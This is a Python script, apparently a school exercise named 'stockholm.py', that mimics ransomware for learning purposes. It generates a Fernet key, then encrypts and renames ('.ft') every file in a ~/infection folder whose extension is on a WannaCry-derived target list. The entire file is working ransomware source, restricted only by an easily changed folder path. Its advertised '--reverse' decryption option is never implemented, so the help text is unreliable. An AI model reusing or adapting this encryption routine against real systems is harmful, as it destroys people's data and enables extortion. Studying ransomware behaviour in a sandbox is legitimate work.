#!/usr/bin/python3

# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: sleleu <sleleu@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/09/22 17:41:44 by sleleu            #+#    #+#              #
#    Updated: 2023/09/22 17:41:46 by sleleu           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import os, argparse
from cryptography.fernet import Fernet

wannacry_extensions: set[str] = {
    ".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2",
    ".docb", ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk",
    ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
    ".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc",
    ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb", ".db", ".sxc",
    ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
    ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods",
    ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb", ".max",
    ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds",
    ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot",
    ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
    ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw",
    ".xlc", ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott",
    ".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt",
    ".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem",
    ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg", ".p12",
    ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr",
    ".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt",
    ".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key",
    ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx",
    ".ppsm", ".602", ".iso", ".mkv", ".brd", ".myi", ".odp", ".der",
    ".ppsx", ".sxi"
}

def parse_arguments():
    desc = "Stockholm is a Python script designed for testing and \
        gaining a better understanding of how ransomware functions. \
        It encrypts data using the Fernet encryption method and appends \
        the '.ft' extension to all files within the specified folder. This \
        program exclusively operates within a folder named 'infection' located \
        in the user's HOME directory and only encrypts files whose extensions have \
        been targeted by Wannacry."
    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("-v", "--version", help="show the version of the program.")
    parser.add_argument("-r", "--reverse", nargs=1, metavar="<KEY>", help="reverse the infection with the <KEY> entered as argument")
    parser.add_argument("-s", "--silent", help="the program will not produce any output")
    return parser.parse_args()

def store_key(key: bytes) -> None:
    if os.path.exists("master.key"):
        print("Stockholm.py: file 'master.key' already exist. Be careful not to override/delete the previous key before decryption.\n\
              If you are certain of what you're doing, delete the previous master.key file beforehand.")
        exit(1)
    try:
        with open("master.key", "wb") as file:
            file.write(key)
    except OSError as error:
        print(error)
        exit(1)

def add_extension(filepath: str)-> None:
    if filepath.endswith(".ft"):
        return
    else:
        os.rename(filepath, filepath + ".ft")

def encrypt_file(key: bytes, filepath: str):
    try:
        with open(filepath, "rb") as file:
            file_content = file.read()
    except OSError as error:
        print(error)
        return
    fernet = Fernet(key)
    encrypted_content = fernet.encrypt(file_content)
    try:
        with open(filepath, "wb") as file:
            file.write(encrypted_content)
    except OSError as error:
        print(error)
        return

def encryption(key: bytes, path: str)-> None:
    files = os.listdir(path)
    for filename in files:
        filepath = os.path.join(path, filename)
        file_extension = "." + filepath.split(".")[-1]
        if file_extension not in wannacry_extensions:
            continue
        if os.path.isdir(filepath) is True:
            encryption(key, filepath)
        else:
            encrypt_file(key, filepath)
            if file_extension != ".ft":
                add_extension(filepath)

def get_home()-> str:
    home: str = os.path.expanduser("~")
    try:
        assert home is not None, "stockholm.py: error: $HOME environnement variable is not defined"
        assert os.path.isdir(home) is not False, "stockholm.py: error: $HOME environnement variable is incorrect"
    except AssertionError as error:
        print(error)
        exit(1)
    return home

def get_path(home: str)-> str:
    path: str = os.path.join(home, "infection")
    try:
        assert os.path.isdir(path) is not False, "stockholm.py: error: infection folder does not exist"
    except AssertionError as error:
        print(error)
        exit(1)
    return path

if __name__ == "__main__":
    args = parse_arguments()
    if args.version:
        print("Stockholm 1.0.1")
        exit(0)
    home: str = get_home()
    path: str = get_path(home)
    key: bytes = Fernet.generate_key()
    store_key(key)
    encryption(key, path)